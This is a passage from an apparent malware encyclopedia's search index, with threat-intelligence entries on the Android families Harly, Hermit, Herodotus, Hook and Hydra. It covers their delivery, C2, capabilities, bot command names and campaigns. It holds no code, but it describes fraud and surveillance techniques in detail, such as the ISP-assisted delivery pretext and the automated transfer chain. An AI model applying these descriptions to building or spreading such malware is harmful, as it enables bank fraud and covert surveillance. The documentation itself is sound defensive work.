start.</p>"},{"location":"malware/families/harly/#native-library-rustgo","title":"Native Library (Rust/Go)","text":"<p>HUMAN Security's analysis found that threat actors use Rust and Go to build the native loader libraries. The use of compiled native code for the loader serves two purposes:</p> <ol> <li>Static analysis tools focused on Dalvik bytecode cannot inspect the decryption logic</li> <li>Rust and Go binaries are harder to reverse engineer than standard JNI C/C++ libraries</li> </ol> <p>The threat actors' Rust and Go proficiency appears limited to the loader component. The actual fraud logic in the decrypted DEX is standard Java/Kotlin.</p>"},{"location":"malware/families/harly/#c2-communication","title":"C2 Communication","text":"<p>Harly contacts a C2 server after the payload is decrypted and loaded. The C2 provides:</p> <ul> <li>List of subscription services to target</li> <li>Subscription page URLs</li> <li>JavaScript injection scripts for form filling</li> <li>Configuration updates</li> </ul> <p>The C2 address is embedded in the encrypted payload, not in the outer APK, so it is only visible after decryption.</p>"},{"location":"malware/families/harly/#country-targeting","title":"Country Targeting","text":"<p>Like Joker, Harly checks the device's MCC/MNC to determine if the victim's carrier supports the targeted subscription services. Kaspersky noted that some analyzed samples only operated with Thai mobile operators, though the family targets multiple regions globally.</p>"},{"location":"malware/families/harly/#target-regions","title":"Target Regions","text":"<p>Harly targets regions with active WAP billing and premium SMS infrastructure:</p> Region Notes Southeast Asia Thailand confirmed as a primary target; Indonesia, Malaysia also targeted Europe Multiple Western European carriers targeted Middle East Carriers with WAP billing support <p>Target selection is dynamic, controlled by C2 configuration rather than hardcoded in the app.</p>"},{"location":"malware/families/harly/#notable-campaigns","title":"Notable Campaigns","text":"<p>2020-2022: Over 190 Harly-infected apps accumulate 4.8M+ downloads on Google Play before Kaspersky publishes their analysis in September 2022, leading to removal of identified apps.</p> <p>2022, September: Kaspersky names and documents the Harly family, distinguishing it from Joker by its embedded payload architecture and detailing the invisible WebView subscription mechanism.</p> <p>2022, October: PolySwarm integrates Harly detection and publishes a summary correlating Kaspersky's findings with additional variant telemetry.</p> <p>2023: HUMAN Security's Satori team publishes their investigation, uncovering 95 additional malicious apps and documenting the Rust/Go native loader evolution. Collaboration with Google leads to removal of identified apps from the Play Store.</p> <p>2023: Kaspersky later identified Fleckpe, a related subscription trojan family using native library droppers, found in 11 Play Store apps with 620,000+ downloads.</p> <p>2023-present: New variants continue to appear on Google Play. The family adapts by rotating developer accounts and modifying the native loader to evade updated Play Protect signatures. Kaspersky's 2022 mobile threat report lists Harly among the most prevalent subscription trojans on Android, and the family has been independently reverse engineered by researchers confirming the continued evolution of decryption techniques.</p>"},{"location":"malware/families/harly/#references","title":"References","text":""},{"location":"malware/families/hermit/","title":"Hermit","text":"<p>Hermit is a modular commercial spyware developed by Italian firm RCS Lab S.p.A. and distributed through ISP-level network injection. Its defining operational characteristic: the target's mobile data connection is disabled (with ISP cooperation), then an SMS is sent with a link to download an app that will supposedly \"restore\" connectivity. The target installs what appears to be a carrier support app but is actually the Hermit implant. This ISP-assisted delivery model was first documented in Italy and Kazakhstan. Hermit's modular architecture downloads individual surveillance capabilities as separate modules from C2 after initial installation, reducing the implant's static footprint.</p>"},{"location":"malware/families/hermit/#overview","title":"Overview","text":"Attribute Details First Seen 2019 (estimated), publicly documented June 2022 Status Active Type Commercial spyware (government-exclusive) Attribution RCS Lab S.p.A. (Milan, Italy), with Tykelab Srl suspected as a front company Aliases None widely used Platforms Android (primary), iOS"},{"location":"malware/families/hermit/#origin-and-lineage","title":"Origin and Lineage","text":"<p>RCS Lab S.p.A. has operated since 1993, initially providing lawful intercept solutions to Italian law enforcement. The company transitioned into offensive mobile surveillance tools, positioning itself in the same market as NSO Group and FinFisher but with a lower profile.</p> <p>Lookout first published their discovery of Hermit in June 2022, identifying the implant through samples that impersonated telecommunications apps. Google TAG subsequently published a companion analysis confirming the ISP-assisted delivery mechanism and attributing the spyware to RCS Lab.</p> <p>Lookout linked RCS Lab to a suspected front company called Tykelab Srl, a telecommunications solutions company headquartered in the same Italian cities (Milan and Rome). The connection was established through shared SSL certificates on C2 infrastructure: one IP used for Hermit C2 had an SSL certificate shared with another IP whose certificate directly named \"RCS\" as the organization and \"Tykelab\" as the organizational unit.</p>"},{"location":"malware/families/hermit/#distribution","title":"Distribution","text":"<p>Hermit's ISP-assisted delivery is its most distinctive feature and represents a capability that requires government-level access to telecommunications infrastructure.</p>"},{"location":"malware/families/hermit/#isp-level-network-injection","title":"ISP-Level Network Injection","text":"<p>The attack flow, as documented by Google TAG:</p> <ol> <li>The operator (with ISP cooperation) disables the target's mobile data connection</li> <li>The target receives an SMS message appearing to come from their mobile carrier</li> <li>The message claims there is a connectivity issue and provides a link to download an app that will \"fix\" the problem</li> <li>The target, unable to use mobile data and believing the carrier is helping, downloads and installs the APK</li> <li>The app, branded as the carrier's support tool, is actually the Hermit implant</li> <li>Mobile data is restored, reinforcing the belief that the app worked</li> </ol> <p>This delivery method exploits a realistic scenario: users experiencing connectivity issues naturally trust messages from their carrier. The ISP's involvement makes the pretext convincing, because the connectivity problem is real.</p>"},{"location":"malware/families/hermit/#app-impersonation","title":"App Impersonation","text":"<p>Hermit samples analyzed by Lookout impersonated applications from:</p> Impersonated Entity Country Samsung Generic Vivo Generic Oppo Generic Mobile carrier apps (specific to target ISP) Italy, Kazakhstan <p>Each sample uses the legitimate branding and UI of the impersonated company, including icons, splash screens, and app names.</p>"},{"location":"malware/families/hermit/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/hermit/#core-implant","title":"Core Implant","text":"<p>The initial Hermit APK is relatively lightweight. It establishes persistence and C2 communication, then downloads surveillance modules on demand.</p> Core Capability Implementation Persistence Registers as device administrator, uses alarm-based scheduling to maintain execution C2 communication HTTPS with certificate pinning to C2 servers Module loading Downloads additional modules as DEX files or native libraries from C2 Root exploitation Attempts to gain root privileges using known Android exploits Firebase integration Uses Google Firebase for some C2 coordination (Google revoked Hermit's Firebase account upon discovery)"},{"location":"malware/families/hermit/#downloadable-modules","title":"Downloadable Modules","text":"<p>Each surveillance capability is implemented as a separate module downloaded post-installation. Lookout documented the following modules:</p> Module Function Camera Capture photos and video from front and rear cameras Microphone Record ambient audio Call recording Record voice calls Contacts Exfiltrate contact list SMS Read and exfiltrate SMS messages Location GPS tracking and cell tower positioning Photos Access and exfiltrate photo library Email Read email from device accounts Calendar Exfiltrate calendar events Browser Extract bookmarks, history, and search data Clipboard Monitor and capture clipboard contents File manager Browse and exfiltrate files from device storage App list Enumerate installed applications Call log Extract call history Notifications Intercept and read notifications Audio recording Record calls and VoIP conversations Screen Capture screenshots <p>The modular design means the initial implant has a small static footprint, making it harder to detect through signature-based scanning. Modules are only downloaded when the operator tasks a specific capability, so a device compromised for contact exfiltration may never receive the camera module.</p>"},{"location":"malware/families/hermit/#ios-variant","title":"iOS Variant","text":"<p>Google TAG documented an iOS variant that abused Apple enterprise certificates to sideload outside the App Store. The iOS version included six exploits (four known, two zero-day at the time of discovery): CVE-2021-30883 and CVE-2021-30983 were the zero-days, both iOS kernel vulnerabilities. Apple subsequently revoked the abused enterprise certificates.</p>"},{"location":"malware/families/hermit/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/hermit/#exploit-chains","title":"Exploit Chains","text":"<p>Google TAG noted that RCS Lab's Android implant requests permissions that grant access to SMS, camera, microphone, and other sensitive data. When installed on a device where the user grants these permissions, no exploit is strictly necessary. For deeper access (root), the implant bundles known Android kernel exploits.</p> <p>On iOS, the exploit chain includes:</p> CVE Type Notes CVE-2021-30883 Kernel (IOMobileFrameBuffer) 0-day at time of use CVE-2021-30983 Kernel 0-day at time of use, analyzed by Google Project Zero"},{"location":"malware/families/hermit/#persistence","title":"Persistence","text":"<p>The Android implant achieves persistence through multiple mechanisms:</p> <ul> <li>Device administrator registration</li> <li><code>RECEIVE_BOOT_COMPLETED</code> broadcast receiver to restart on boot</li> <li>Alarm-based scheduling to periodically check C2 for commands</li> <li>Foreground service with persistent notification (sometimes disguised as a system notification)</li> </ul>"},{"location":"malware/families/hermit/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Hermit C2 servers use HTTPS with specific TLS certificate patterns that enabled Lookout and Google TAG to fingerprint and map the infrastructure. The C2 protocol supports:</p> <ul> <li>Module download and installation</li> <li>Tasking (which modules to activate, what data to collect)</li> <li>Data exfiltration (encrypted uploads over HTTPS)</li> <li>Implant updates and reconfiguration</li> </ul>"},{"location":"malware/families/hermit/#anti-analysis","title":"Anti-Analysis","text":"<p>Compared to FinSpy's extensive obfuscation, Hermit's anti-analysis techniques are relatively conventional:</p> <ul> <li>String encryption</li> <li>Dynamic module loading (reduces static analysis surface)</li> <li>Certificate pinning on C2 connections</li> <li>Self-removal capability if analysis environment detected</li> </ul>"},{"location":"malware/families/hermit/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"Country Context Year Source Italy Used in an anti-corruption operation by Italian authorities 2019 Lookout Kazakhstan Government deployment against domestic targets, with ISP cooperation from Kazakh telecom providers 2022 Lookout, Google TAG Syria Northern Syria deployment, likely by a government actor Unknown Lookout <p>The Kazakhstan deployment drew the most attention because it involved a government deploying commercial spyware against its own citizens with ISP-level cooperation, during a period of domestic political unrest.</p>"},{"location":"malware/families/hermit/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>2019: Hermit is reportedly used in Italy as part of a law enforcement anti-corruption operation. Lookout later identifies samples from this period.</p> <p>April 2022: Lookout detects new Hermit samples in the wild and begins analysis.</p> <p>June 16, 2022: Lookout publishes \"Hermit: Italian Spyware Discovered\", documenting the modular architecture, ISP-assisted delivery, and linking the spyware to RCS Lab and Tykelab through infrastructure analysis.</p> <p>June 23, 2022: Google TAG publishes their analysis, confirming Lookout's findings and adding detail on the ISP injection mechanism. TAG notes that ISPs disabled target mobile data connectivity before sending the malicious SMS. Google begins notifying affected Android users and revokes Hermit's Firebase account. Apple revokes the abused enterprise certificates for the iOS variant.</p> <p>June 2022: Google updates Play Protect to block Hermit from executing on Android devices.</p> <p>2022-present: Google TAG includes RCS Lab in their broader reporting on commercial surveillance vendors (CSVs), warning that companies like RCS Lab are stockpiling zero-day vulnerabilities. TAG's 2024 reporting notes that CSVs were responsible for 20 out of 25 zero-days discovered being exploited in the wild in 2023.</p>"},{"location":"malware/families/hermit/#references","title":"References","text":""},{"location":"malware/families/herodotus/","title":"Herodotus","text":"<p>Herodotus is an Android banking trojan discovered by ThreatFabric in October 2025, sold as a malware-as-a-service (MaaS) platform on underground forums by a threat actor using the handle \"K1R0.\" Its standout feature is a human behavior mimicry system that introduces natural typing delays, variable input speeds, and randomized interaction patterns during remote control sessions to evade anti-fraud behavioral biometric systems. Reverse engineering reveals code-level connections to Brokewell through shared obfuscation techniques and a dynamically loaded Brokewell module, though Herodotus is a distinct threat with its own operator and distribution model rather than a direct evolution.</p>"},{"location":"malware/families/herodotus/#overview","title":"Overview","text":"Attribute Details First Seen October 2025 Status Active Type Banking trojan, MaaS, device-takeover Aliases None known Attribution Threat actor \"K1R0\" (underground forum handle) Distribution MaaS model, active campaigns in Italy and Brazil"},{"location":"malware/families/herodotus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric discovered Herodotus in October 2025 while tracking new threats on underground forums. The malware was being advertised as a MaaS platform by \"K1R0,\" who offered it to affiliates for conducting banking fraud campaigns.</p> <p>Reverse engineering of Herodotus samples revealed significant code-level connections to Brokewell, a banking trojan discovered by ThreatFabric in April 2024 and attributed to the developer \"Baron Samedit Marais.\" The two families share obfuscation techniques, and Herodotus dynamically loads a Brokewell module at runtime. Despite these technical links, Herodotus operates under a different threat actor, uses a different distribution model (MaaS versus direct operation), and introduces novel capabilities not present in Brokewell. This pattern suggests that Brokewell's codebase was adopted, licensed, or forked by the K1R0 operator to build a new product rather than representing a linear evolution of the original malware.</p>"},{"location":"malware/families/herodotus/#distribution","title":"Distribution","text":"Vector Details MaaS platform Sold to affiliates on underground forums by \"K1R0\" Affiliate-driven Individual operators distribute through their own channels Active campaigns Observed targeting users in Italy and Brazil <p>As a MaaS operation, Herodotus follows the same model as families like Octo and Hook. The developer provides the malware, C2 infrastructure, and builder tools. Affiliates purchase access and handle distribution through their own methods, which may include sideloading, phishing, or dropper apps. ThreatFabric observed active campaigns targeting Italy and Brazil at the time of discovery, indicating at least two distinct affiliate operations.</p>"},{"location":"malware/families/herodotus/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/herodotus/#core-features","title":"Core Features","text":"Capability Implementation Device-takeover Full interactive remote control of infected devices Human behavior mimicry Simulates natural typing delays and variable input speeds during remote sessions Overlay attacks WebView-based inject screens for credential harvesting Accessibility abuse Leverages accessibility services for device interaction and data capture Remote control Real-time device control through screen streaming and command execution"},{"location":"malware/families/herodotus/#human-behavior-mimicry","title":"Human Behavior Mimicry","text":"<p>The defining innovation in Herodotus is its approach to evading behavioral biometric anti-fraud systems. Modern banking apps and fraud detection platforms analyze how a user interacts with the device, measuring typing speed, touch pressure patterns, swipe velocity, and input cadence. When a remote-control trojan operates a device, the interaction patterns are typically mechanical: uniform delays between inputs, constant speeds, and perfectly precise tap coordinates. Behavioral biometric systems flag these robotic patterns as anomalous.</p> <p>ThreatFabric documented how Herodotus addresses this by introducing controlled randomness into its remote control actions:</p> <ol> <li>Typing is performed character by character with variable delays between keystrokes, mimicking natural human typing rhythm</li> <li>Input speed varies across different fields and sessions, avoiding the constant cadence of automated input</li> <li>Touch interactions include slight coordinate variations and timing inconsistencies consistent with human imprecision</li> <li>Pauses and hesitations are injected between actions to simulate human decision-making</li> </ol> <p>This technique represents an escalation in the arms race between device-takeover malware and behavioral analytics defenses, moving beyond simply controlling a device to controlling it in a way that appears human.</p>"},{"location":"malware/families/herodotus/#device-takeover","title":"Device-Takeover","text":"<p>Herodotus provides affiliates with full device-takeover capability, allowing operators to interact with the victim's device as if physically holding it. This enables on-device fraud (ODF) where transactions are initiated from the victim's own device within authenticated banking sessions, bypassing new-device detection and device fingerprinting controls.</p>"},{"location":"malware/families/herodotus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/herodotus/#brokewell-module-loading","title":"Brokewell Module Loading","text":"<p>The most significant technical finding from ThreatFabric's reverse engineering is the dynamic loading of a Brokewell module. At runtime, Herodotus decrypts and loads a module that shares code and obfuscation patterns with the Brokewell banking trojan. This module provides core banking trojan functionality while Herodotus layers its own innovations, particularly the behavior mimicry system, on top.</p>"},{"location":"malware/families/herodotus/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Shared obfuscation Uses obfuscation techniques also found in Brokewell samples Dynamic loading Core banking module loaded at runtime rather than bundled statically Behavioral evasion Human mimicry specifically designed to defeat behavioral analytics"},{"location":"malware/families/herodotus/#maas-infrastructure","title":"MaaS Infrastructure","text":"<p>As a MaaS platform, Herodotus provides affiliates with:</p> <ul> <li>Builder tools for generating customized APKs</li> <li>C2 infrastructure for managing infected devices</li> <li>Operator panels for conducting remote sessions</li> <li>Inject kits for targeting specific banking applications</li> </ul>"},{"location":"malware/families/herodotus/#target-regions","title":"Target Regions","text":"Period Primary Targets October 2025 Italy, Brazil <p>ThreatFabric observed active campaigns in Italy and Brazil at the time of discovery. As a MaaS platform, targeting is expected to expand as additional affiliates adopt the service and launch campaigns in their regions of focus.</p>"},{"location":"malware/families/herodotus/#notable-campaigns","title":"Notable Campaigns","text":"<p>October 2025: ThreatFabric disclosed Herodotus as a new MaaS banking trojan sold by \"K1R0\" on underground forums. Active campaigns were identified in Italy and Brazil. The malware's human behavior mimicry during remote control sessions was highlighted as a novel evasion technique targeting behavioral biometric anti-fraud systems. Code analysis revealed connections to Brokewell through shared obfuscation and a dynamically loaded module.</p>"},{"location":"malware/families/herodotus/#related-families","title":"Related Families","text":"Family Relationship Brokewell Shares obfuscation techniques and code structures. Herodotus dynamically loads a Brokewell module at runtime, indicating code reuse or licensing from Brokewell's developer. Octo Comparable MaaS banking trojan with device-takeover capability, though Octo does not implement behavioral mimicry."},{"location":"malware/families/herodotus/#references","title":"References","text":""},{"location":"malware/families/hook/","title":"Hook","text":"<p>Hook is the most feature-complete family in the Cerberus lineage, combining the banking trojan foundations of Ermac with VNC-like screen streaming, a full RAT, file system access, and ATS (Automated Transfer System) capabilities. Announced in January 2023 by the same \"DukeEugene\" threat actor behind Ermac, Hook represents the current state of the art for Cerberus-derived Android malware. After DukeEugene's departure and the source code sale in mid-2023, Hook proliferated rapidly, with over 200 new C2 servers detected in the final months of 2023 alone.</p>"},{"location":"malware/families/hook/#overview","title":"Overview","text":"Attribute Details First Seen January 2023 Status Active, widely deployed post-leak Type Banking trojan + RAT (MaaS) Attribution \"DukeEugene\" (original), multiple operators post-leak Aliases HookBot Source Built on Ermac codebase; source code sold May 2023 for $70,000, fully leaked October 2023 Rental Price $7,000/month (pre-leak)"},{"location":"malware/families/hook/#origin-and-lineage","title":"Origin and Lineage","text":"<p>DukeEugene advertised Hook on January 12, 2023, claiming it was written from scratch. ThreatFabric's analysis immediately disputed this, identifying Hook as an Ermac fork with added functionality. NCC Group later confirmed this definitively: all 30 commands available in Ermac exist in Hook with near-identical code implementation. Hook adds 38 new commands on top of the Ermac base.</p> <p>The lineage is direct and well-documented:</p> <pre><code>Cerberus (2019-2020)\n  \u2514\u2500\u2500 Source leaked September 2020\n        \u2514\u2500\u2500 Ermac (2021-2022), DukeEugene\n              \u2514\u2500\u2500 Hook (2023-present), DukeEugene\n</code></pre> <p>DukeEugene offered Hook at $7,000/month, positioning it as the premium successor to Ermac's $5,000/month rental. On April 19, 2023, DukeEugene announced he was leaving for military service and closing the project. Two days prior, the coder posted the source code for sale at $70,000. By May 11, 2023, the source was reportedly sold. The full source code leaked publicly by October 2023, triggering an explosion in HookBot deployments across the threat landscape.</p>"},{"location":"malware/families/hook/#distribution","title":"Distribution","text":"<p>Hook reaches devices through the same channels established by its predecessors, with expanded use of Google Play droppers.</p> Vector Details Google Play droppers Benign-looking apps that pass Play Protect screening, then download the Hook payload after a delay period Phishing sites Fake app download pages mimicking banking, delivery, and browser update sites Smishing SMS campaigns directing victims to phishing domains Telegram channels Distribution through Telegram groups and channels Third-party stores APKs hosted on unofficial Android app markets <p>Post-leak distribution expanded significantly. With the builder panel and C2 code freely available, setting up a Hook operation became trivial: Silent Push documented that the leaked source allows operators to deploy a fully functional C2 server and generate disguised Hook APKs within minutes.</p>"},{"location":"malware/families/hook/#capabilities","title":"Capabilities","text":"<p>Hook's capability set is a superset of Ermac's, with the additions focused on device takeover and on-device fraud.</p>"},{"location":"malware/families/hook/#inherited-from-ermac-all-30-commands","title":"Inherited from Ermac (All 30 Commands)","text":"Capability Implementation Overlay attacks WebView-based injects for 468+ banking and crypto apps SMS interception Read, send, redirect SMS for OTP theft Contact harvesting Exfiltrate device contacts Keylogging Accessibility-based keystroke capture App listing Enumerate installed packages Account theft Steal accounts via <code>AccountManager</code> Push notifications Lure users into opening target apps App cache clearing Force re-authentication to capture fresh credentials Open URL Launch arbitrary URLs"},{"location":"malware/families/hook/#new-in-hook-38-additional-commands","title":"New in Hook (38 Additional Commands)","text":"Capability Implementation VNC/screen streaming Real-time screen content streamed to operator via WebSocket UI interaction Operator can tap, swipe, type, and navigate the device remotely Full Device Take Over (DTO) Complete fraud chain from PII exfiltration through transaction execution without additional channels File manager Browse, download, and upload files on the device file system WhatsApp extraction Exfiltrate all WhatsApp messages from the victim device Front camera capture Silently take a photo using the front-facing camera Google cookie theft Steal cookies from Google login sessions Crypto seed phrase theft Expanded support for extracting recovery seeds from cryptocurrency wallets ATS framework Automated Transfer System for executing fraudulent transactions without operator intervention Phone location tracking Real-time GPS tracking of the infected device Gesture simulation Perform swipe gestures (swipe up, scroll to specific element) for navigating banking apps programmatically <p>The VNC-like capability is Hook's defining feature. By streaming the screen and allowing real-time interaction, operators can perform full Device Take Over: logging into banking apps, initiating transfers, handling 2FA challenges, and completing transactions, all from the C2 panel. This places Hook alongside Octo and Hydra as families capable of complete on-device fraud.</p>"},{"location":"malware/families/hook/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/hook/#communication-protocol","title":"Communication Protocol","text":"<p>The most significant architectural change from Ermac is Hook's communication layer. NCC Group's analysis documents the shift:</p> Aspect Ermac Hook Protocol HTTP WebSocket (Socket.IO) + HTTP Encryption AES-256-CBC + Base64 AES-256-CBC + Base64 (same scheme) C2 URL pattern Random URLs ending in <code>.php/</code> WebSocket connection for real-time commands; HTTP for data exfiltration Real-time capability Polling-based Persistent bidirectional channel <p>Hook uses Socket.IO for WebSocket communication, enabling the persistent bidirectional connection required for VNC streaming and real-time UI interaction. The encryption mechanism remains the same as Ermac: data is encrypted with AES-256-CBC and then Base64 encoded. HTTP is still used alongside WebSocket for bulk data exfiltration (contacts, SMS, files).</p>"},{"location":"malware/families/hook/#vnc-implementation","title":"VNC Implementation","text":"<p>Hook's VNC-like feature works through the Android Accessibility Service:</p> <ol> <li>The accessibility service captures screen content and transmits it to the C2 over WebSocket</li> <li>The operator views the live screen in the C2 admin panel</li> <li>Operator commands (taps, swipes, text input) are sent back over WebSocket</li> <li>The accessibility service translates these into <code>AccessibilityNodeInfo</code> actions and <code>dispatchGesture</code> calls on the device</li> <li>The loop continues at sufficient frame rate for interactive operation</li> </ol> <p>This approach does not require screen recording permissions or <code>MediaProjection</code>: the accessibility service has inherent access to the UI tree and can both read content and perform actions.</p>"},{"location":"malware/families/hook/#ats-automated-transfer-system","title":"ATS (Automated Transfer System)","text":"<p>Hook's ATS capability automates the fraud chain that would otherwise require manual operator intervention via VNC:</p> <ol> <li>Extract credentials from overlay capture</li> <li>Open the real banking app via accessibility</li> <li>Navigate to the transfer screen using programmatic gestures</li> <li>Fill in transfer details (recipient, amount) from C2 configuration</li> <li>Handle 2FA challenges by intercepting SMS or reading authenticator codes</li> <li>Confirm the transaction</li> </ol> <p>ATS reduces operator workload and increases fraud throughput by executing transfers without human involvement during the transaction itself.</p>"},{"location":"malware/families/hook/#bot-commands-selected-new-commands","title":"Bot Commands (Selected New Commands)","text":"Command Action <code>screenStream</code> Begin VNC screen streaming over WebSocket <code>screenClick</code> Perform tap at specified coordinates <code>screenSwipe</code> Perform swipe gesture <code>screenType</code> Input text at focused field <code>fileManager</code> List directory contents on device <code>fileDownload</code> Download file from device to C2 <code>fileUpload</code> Upload file from C2 to device <code>getWhatsApp</code> Extract WhatsApp message database <code>takePhoto</code> Capture photo via front camera <code>getCookies</code> Steal browser/Google session cookies <code>getSeedPhrase</code> Extract cryptocurrency wallet recovery seeds <code>getLocation</code> Return device GPS coordinates"},{"location":"malware/families/hook/#obfuscation-and-anti-analysis","title":"Obfuscation and Anti-Analysis","text":"<p>Hook inherits Ermac's obfuscation baseline and adds:</p> Technique Details Blowfish string encryption Inherited from Ermac AES-256-CBC C2 encryption Inherited from Ermac Class/method renaming Standard obfuscation Dynamic C2 resolution Encrypted C2 addresses resolved at runtime Multi-stage dropper Play Store apps delay payload delivery to pass scanning"},{"location":"malware/families/hook/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Core dependency for overlay triggering, VNC screen streaming, keylogging, ATS, and remote device control SYSTEM_ALERT_WINDOW Display overlay injections over banking and crypto apps READ_SMS Read SMS for OTP interception RECEIVE_SMS Intercept incoming SMS in real-time SEND_SMS Send SMS from victim device READ_CONTACTS Exfiltrate contact list READ_PHONE_STATE Device fingerprinting CAMERA Front camera photo capture ACCESS_FINE_LOCATION GPS tracking of infected device INTERNET C2 communication via WebSocket and HTTP RECEIVE_BOOT_COMPLETED Persistence across reboots REQUEST_INSTALL_PACKAGES Dropper installs main payload"},{"location":"malware/families/hook/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Hook targets the broadest set of financial applications in the Cerberus lineage. ThreatFabric reported 468 banking app targets across multiple continents:</p> Region Countries North America United States, Canada Western Europe Spain, UK, France, Italy, Portugal Eastern Europe Poland, Turkey Asia-Pacific Australia Cryptocurrency (global) MetaMask, Trust Wallet, Coinbase, Binance, Crypto.com, Blockchain.com <p>The US, Spain, and Australia have the highest concentration of targeted financial apps. Post-leak, individual operators have expanded the target list with custom injects for regional institutions.</p>"},{"location":"malware/families/hook/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 12, 2023: DukeEugene announced Hook on underground forums, advertising it at $7,000/month. ThreatFabric published their analysis identifying Hook as an Ermac fork with RAT capabilities, disputing the developer's claim of a from-scratch build. The Hacker News covered the discovery.</p> <p>April 19, 2023: DukeEugene announced project closure, citing military service. The source code was posted for sale at $70,000.</p> <p>May 11, 2023: Source code reportedly sold. The coder requested the sale thread be closed.</p> <p>September 2023: NCC Group published a detailed technical comparison of Ermac and Hook, confirming shared codebase and documenting all 38 new commands. The Hacker News reported on the expanded analysis.</p> <p>October 2023: The full Hook source code, including the builder panel, leaked publicly. This triggered a proliferation of HookBot C2 infrastructure.</p> <p>Late 2023: Silent Push identified over 200 new HookBot C2 servers deployed in the months following the leak. Their investigation uncovered 24 active DukeEugene-linked control panels administering Ermac, Hook, and related variants. Hook was the most prolific Android banking malware family of 2023, targeting 468 banking applications.</p> <p>2024-present: Hook derivatives continue to emerge. With both the Ermac and Hook source codes publicly available, new operators build on either codebase, blurring the boundary between the two families. The combination of VNC, RAT, ATS, and traditional overlay attacks in a single freely available package makes Hook the most accessible full-featured Android banking trojan ever leaked.</p> <p>August 2025, Hook v3: Zimperium zLabs identified Hook v3 with 107 remote commands (38 new beyond Hook v1/v2). New capabilities include ransomware-style lockscreen overlays, fake NFC/payment card overlays for card data collection, lockscreen bypass via deceptive PIN prompts, transparent overlays for silent gesture capture, and real-time device streaming. The v3 variant was distributed via GitHub-hosted malicious APKs. Unused RabbitMQ infrastructure in the code suggests a future C2 channel evolution. Hook v3 represents a convergence of banking trojan and ransomware capabilities in a single package.</p>"},{"location":"malware/families/hook/#references","title":"References","text":"<ul> <li>ThreatFabric - Hook: a new Ermac fork with RAT capabilities (January 2023)</li> <li>NCC Group - From Ermac to Hook: Investigating the technical differences (September 2023)</li> <li>Silent Push - DukeEugene investigation (Late 2023)</li> <li>ThreatFabric - Android droppers: the silent gatekeepers of malware (2023)</li> <li>The Hacker News - New Hook malware (January 2023)</li> <li>The Hacker News - Hook banking trojan expanded analysis (September 2023)</li> <li>Zimperium - Hook Version 3 (August 2025)</li> </ul>"},{"location":"malware/families/hydra/","title":"Hydra","text":"<p>Hydra is one of the longest-running Android banking trojan operations, active since 2019 and still operational through an affiliate-based MaaS model. Originally tracked as BianLian (unrelated to the BianLian ransomware group), Hydra combines overlay injection, full Accessibility Service abuse, screen streaming with remote interaction, and on-device fraud capabilities. Its operators rent infrastructure to multiple threat actor groups, making it one of the most broadly deployed mobile banking threats in terms of active affiliates. ThreatFabric reported it as the most prolific Android banking trojan of 2022.</p>"},{"location":"malware/families/hydra/#overview","title":"Overview","text":"Property Value First Seen Early 2019 (dropper component active since 2018 as BianLian) Last Seen / Status Active, MaaS operation ongoing Type Banking trojan, RAT, on-device fraud Attribution Russian-speaking operators; rented to affiliates via underground forums Aliases BianLian (ThreatFabric's original name), Android/BianLian"},{"location":"malware/families/hydra/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric coined the name BianLian, referencing the Chinese theatrical art of rapidly swapping face masks, to describe a dropper family that first appeared in 2018. The dropper masqueraded as utility apps (currency calculators, device cleaners, discount apps) and initially served as a delivery mechanism for other banking trojans, including Anubis.</p> <p>The operators then developed their own banking trojan payload, building on experience gained from distributing other families. This payload became known as Hydra. The relationship between BianLian (the dropper) and Hydra (the banking payload) is tightly coupled: BianLian droppers deliver Hydra payloads, and the same operator group manages both components.</p> <p>Hydra shares some design patterns with the broader BankBot/Anubis lineage. Malpedia notes that BianLian/Hydra shares roots with Anubis and BankBot, though the codebase has diverged substantially through years of independent development.</p>"},{"location":"malware/families/hydra/#distribution","title":"Distribution","text":"<p>Hydra distribution relies on a multi-layered dropper pipeline:</p> <p>Google Play droppers: BianLian droppers have repeatedly reached Google Play, disguised as functional apps with legitimate ratings. ThreatFabric documented how the operators maintained a steady upload cadence, replacing removed apps with new variants. The apps delivered working functionality to maintain user trust and store ratings.</p> <p>Fake app stores and phishing: Cyble identified campaigns distributing Hydra through fake document manager apps. Other campaigns impersonate Google Chrome or Google Play Store to trick users into side-loading the payload.</p> <p>Affiliate-driven distribution: As a MaaS operation, Hydra's distribution varies by affiliate. Each renter configures their own target list, overlay set, and distribution method. Bridewell identified affiliates purchasing webinjects from the \"InTheBox\" marketplace on dark web forums, then deploying them through rented Hydra infrastructure.</p>"},{"location":"malware/families/hydra/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/hydra/#core-feature-set","title":"Core Feature Set","text":"Capability Implementation Overlay injection Fetches target list and injection ZIP from C2; displays phishing WebView over targeted banking/crypto apps Accessibility keylogging Monitors all <code>AccessibilityEvent</code> types, capturing TextField changes and button clicks Screen streaming Uses Screencast APIs to stream device display to C2 in real-time Remote interaction Receives commands from C2 translated to Accessibility actions (clicks, text input, gestures) On-device fraud Combines screen streaming and remote interaction for full device takeover without leaving the victim's device/IP PIN theft Captures lock screen PIN during user unlock via Accessibility monitoring SMS interception Reads, intercepts, and hides incoming SMS for OTP theft Session cookie theft Extracts browser session cookies to hijack authenticated sessions SOCKS5 proxy Routes traffic through infected device, allowing operators to appear as the victim's IP Google Play Protect disable Uses Accessibility to navigate settings and turn off Play Protect Notification suppression Hides notifications from banking apps to prevent victim awareness during fraud"},{"location":"malware/families/hydra/#version-evolution","title":"Version Evolution","text":"Period Key Additions 2018 BianLian dropper: functional app facade, Accessibility-based silent install, delivery of third-party payloads 2019 Hydra payload: overlay injection, SMS interception, basic remote access 2020-2021 Screen streaming via Screencast APIs, TeamViewer-like remote control, SOCKS5 proxy 2022 Session cookie theft, expanded on-device fraud, TOR-based C2 resolution, DGA domains 2023+ Continued affiliate expansion, 